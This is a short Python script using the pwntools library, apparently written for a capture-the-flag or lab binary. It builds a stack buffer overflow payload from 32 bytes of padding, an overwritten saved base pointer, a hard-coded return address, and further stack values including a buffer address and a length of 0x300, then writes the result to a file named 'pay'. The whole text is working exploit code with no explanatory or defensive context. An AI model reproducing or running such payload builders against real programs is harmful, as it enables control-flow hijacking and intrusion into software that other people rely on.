from pwn import *

junk = b"A" * 32
#rbp = p64(0x007fffffffdfa0)
rbp = p64(0x007fffffffdfd0)
ret = p64(0x401040)
#ran = b"EEEEEEEE"
#buf = p64(0x007fffffffdfd0)
buf = p64(0x401017)
count = p64(0x300)
pay = junk + rbp + ret + buf + count + b"\n"

f = open("pay", "wb")

f.write(pay);
